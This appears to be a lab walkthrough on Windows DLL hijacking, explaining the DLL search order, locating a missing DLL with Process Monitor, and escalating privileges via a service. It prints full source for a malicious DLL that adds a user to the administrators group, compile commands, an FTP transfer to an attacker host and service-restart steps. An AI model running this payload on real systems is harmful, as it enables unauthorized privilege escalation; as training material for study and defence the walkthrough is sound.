# DLL Hijacking 

**Dynamic Link Library**

- A DLL (Dynamic Link Library) is a file (extension .dll) that contains reusable code and functions
- Applications load DLLs when they need those functions (e.g., user32.dll for GUI functions)
- Loading is done via functions like LoadLibrary() or LoadLibraryEx() in Windows API

**DLL Hijacking** 

- DLL Hijacking happens when an attacker tricks an application into loading a malicious DLL instead of the legitimate one
- This works because Windows follows a search order when loading DLLs. If the application does not specify the full path of the DLL, Windows searches in a sequence of directories (e.g., the application folder, system directories, PATH, etc.)
- If the attacker can place a malicious DLL with the same name in a directory searched before the real DLL location, the application will load the attacker’s DLL

**Victim**

1. Open the Tools folder that is located on the desktop and then go the Process Monitor folder
2. In reality, executables would be copied from the victim’s host over to the attacker’s host for analysis during run time. Alternatively, the same software can be installed on the attacker’s host for analysis, in case they can obtain it. To simulate this, right click on Procmon.exe and select ‘Run as administrator’ from the menu
3. In procmon, select "filter".  From the left-most drop down menu, select ‘Process Name’
4. In the input box on the same line type: dllhijackservice.exe
5. Make sure the line reads “Process Name is dllhijackservice.exe then Include” and click on the ‘Add’ button, then ‘Apply’ and lastly on ‘OK’
6. Next, select from the left-most drop down menu ‘Result’.
7. In the input box on the same line type: NAME NOT FOUND
8. Make sure the line reads “Result is NAME NOT FOUND then Include” and click on the ‘Add’ button, then ‘Apply’ and lastly on ‘OK’
9. Open command prompt and type: sc start dllsvc
10. Scroll to the bottom of the window. One of the highlighted results shows that the service tried to execute ‘C:\Temp\hijackme.dll’ yet it could not do that as the file was not found. Note that ‘C:\Temp’ is a writable location

Now copy 'C:\Users\User\Desktop\Tools\Source\windows_dll.c' to the attacker machine using ftp port open in the attacker machine

**Attacker** 

```
// open ftp port
python -m pyftpdlib -p 21 

// login in ftp using anonymous in windows machine 
ftp attacker_ip 
put windows_dll.c 
```

Content of windows_dll.c (to make the user as administrator privilege)

```
// For x64 compile with:  x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll 
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll 

#include <windows.h>

BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
    if (dwReason == DLL_PROCESS_ATTACH) {
        system("cmd.exe /k net localgroup administrator user /add");
        ExitProcess(0);
    }
    return TRUE;
}
```

**Exploitation** 

```
// Now compile the code 
x86_64-w64-mingw32-gcc windows_dll.c -shared -o hijackme.dll

// Now we are transffering the hijackme.dll to windows machine using python server and place in "C:\Temp"

// stop and start the dllsvc to make dll hijacking 
sc stop dllsvc & sc start dllsvc 

// successfully we made user as administrator
net localgroup administrators 
Administrator 
user 
```
